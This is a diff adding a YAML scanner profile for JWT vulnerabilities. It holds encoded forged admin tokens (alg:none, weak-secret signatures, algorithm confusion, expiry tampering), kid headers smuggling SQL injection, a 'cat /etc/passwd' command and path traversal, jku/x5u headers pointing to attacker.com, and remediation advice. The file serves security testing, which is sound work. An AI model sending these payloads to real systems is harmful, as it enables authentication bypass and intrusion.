@@ -1,0 +1,182 @@
+# JWT (JSON Web Token) Attack Profile
+# This file defines payloads for testing JWT vulnerabilities
+
+name: "JWT Attacks"
+category: "authentication"
+severity: "critical"
+description: "Tests for JWT vulnerabilities including alg:none bypass, weak secrets, header injection, and claim manipulation"
+
+# Fields commonly containing JWT tokens
+target_fields:
+  - "Authorization"
+  - "Cookie"
+  - "token"
+  - "jwt"
+  - "access_token"
+  - "id_token"
+  - "refresh_token"
+  - "auth_token"
+
+# Attack payloads - each is a plain string token
+payloads:
+  # alg:none — unsigned token (strip signature entirely)
+  - "eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTUxNjIzOTAyMiwgImV4cCI6IDE5MTYyMzkwMjIsICJyb2xlIjogImFkbWluIn0."
+  
+  # alg:NONE (uppercase bypass attempt)
+  - "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."
+  
+  # alg:nOnE (mixed case bypass attempt)
+  - "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."
+  
+  # alg:null (null algorithm value)
+  - "eyJhbGciOm51bGwsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."
+  
+  # Weak secret: 'password' — real HMAC-SHA256 signature
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.GG3HZGyPvxIaUXQUNM2l5ZU8C4hT3Twzjm57QCrA04Y"
+  
+  # Weak secret: 'secret' — real HMAC-SHA256 signature
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.F6nwNxLEFMQ1xa3P2-RY8eERp4DDHrlMMpUqNNx7gzs"
+  
+  # Weak secret: '123456' — real HMAC-SHA256 signature
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.-UmleTeJ1UGMZF27cd6XNgau7AnUhJyKN5K78j_akvM"
+  
+  # Weak secret: '' (empty string) — real HMAC-SHA256 signature
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.QIgQDAov0L6D7LvmD_vTk8iDuSH3BxaqkE9a9CijyOI"
+  
+  # Weak secret: 'jwt' — real HMAC-SHA256 signature
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.miFXQHX5yq4FHKNT7z43rBQN08A-MiShbrQwBQhvgfc"
+  
+  # Algorithm confusion: RS256→HS256 with dummy signature (requires runtime generation with server's public key)
+  # This token has structurally-valid base64url but placeholder signature to pass parsing
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # Algorithm confusion: RS256→HS384 variant
+  - "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # Algorithm confusion: RS256→HS512 variant
+  - "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # kid header injection: path traversal to /dev/null — dummy/placeholder signature
+  - "eyJhbGciOiAiSFMyNTYiLCAia2lkIjogIi4uLy4uL2Rldi9udWxsIiwgInR5cCI6ICJKV1QifQ.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTUxNjIzOTAyMiwgImV4cCI6IDE5MTYyMzkwMjIsICJyb2xlIjogImFkbWluIn0.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # kid header injection: SQL injection payload — dummy/placeholder signature  
+  - "eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEyMycgT1IgJzEnPScxJy0tIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # kid header injection: command injection — dummy/placeholder signature
+  - "eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleTsgY2F0IC9ldGMvcGFzc3dkIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # kid header injection: null byte (%00) — dummy/placeholder signature
+  - "eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEyMyUwMCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # Expiry manipulation: exp set to year 2100 (4102444800) — dummy/placeholder signature
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTUxNjIzOTAyMiwgImV4cCI6IDQxMDI0NDQ4MDAsICJyb2xlIjogImFkbWluIn0.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # Expiry manipulation: exp field removed entirely — dummy/placeholder signature
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTUxNjIzOTAyMiwgInJvbGUiOiAiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # Expiry manipulation: negative exp value
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjotMSwicm9sZSI6ImFkbWluIn0.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # Header injection: jku pointing to attacker JWKS endpoint (requires live endpoint)
+  # Dummy signature - real attack needs valid RSA signature from attacker's key
+  - "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vLndlbGwta25vd24vandrcy5qc29uIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # Header injection: x5u pointing to attacker certificate (requires live endpoint)
+  - "eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vY2VydC5wZW0iLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+
+# Indicators that suggest successful JWT attack
+success_indicators:
+  response_contains:
+    - "admin"
+    - "privileged"
+    - "role"
+    - "authenticated"
+    - "successful"
+    - "welcome"
+    - "dashboard"
+    - "authorized"
+  
+  status_codes:
+    - 200  # Successful bypass - should have been 401/403
+    - 201
+    - 302
+
+# How to fix JWT vulnerabilities
+remediation: |
+  🔧 How to Fix JWT Vulnerabilities:
+
+  1. **Algorithm Verification (CWE-347)**:
+     - Always specify and enforce the expected algorithm
+     - Never allow 'none' algorithm
+     - Prevent algorithm confusion by explicitly checking alg header
+     
+     ```python
+     # Python example with PyJWT
+     import jwt
+     
+     # ✅ GOOD - Explicitly specify algorithm
+     token = jwt.decode(token_string, public_key, algorithms=["RS256"])
+     
+     # ❌ BAD - Allows any algorithm or skips verification
+     token = jwt.decode(token_string, options={"verify_signature": False})
+     ```
+
+  2. **Strong Secrets**:
+     - Use cryptographically strong secrets (minimum 256 bits for HS256)
+     - Generate secrets with secure random generators
+     - Rotate secrets regularly
+     - Never hardcode secrets in source code
+     
+     ```python
+     import secrets
+     # Generate a secure secret
+     secret = secrets.token_urlsafe(32)  # 256 bits
+     ```
+
+  3. **Signature Verification**:
+     - Always verify JWT signatures
+     - Use well-tested libraries (PyJWT, jsonwebtoken, etc.)
+     - Never skip signature validation
+     
+     ```javascript
+     // Node.js example
+     const jwt = require('jsonwebtoken');
+     
+     // ✅ GOOD - Verifies signature
+     const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
+     
+     // ❌ BAD - Skips verification
+     const decoded = jwt.decode(token);
+     ```
+
+  4. **Expiry Validation**:
+     - Always validate 'exp' claim
+     - Reject tokens without 'exp' claim
+     - Consider implementing 'nbf' (not before) claim
+     - Set reasonable token lifetimes
+     
+     ```python
+     # PyJWT automatically validates exp if present
+     token = jwt.decode(
+         token_string,
+         secret,
+         algorithms=["HS256"],
+         options={
+             "require": ["exp", "iat"],  # Require exp and iat claims
+             "verify_exp": True           # Verify expiration
+         }
+     )
+     ```
+
+  5. **Algorithm Selection**:
+     - Prefer RS256 (RSA) over HS256 (HMAC) for better key management
+     - Use EdDSA (Ed25519) for modern implementations
+     - HS256, HS384, HS512 are all valid HMAC algorithms when used correctly
+
+references:
+  - "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+  - "https://cwe.mitre.org/data/definitions/347.html"
+  - "https://portswigger.net/web-security/jwt"
+  - "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"
+
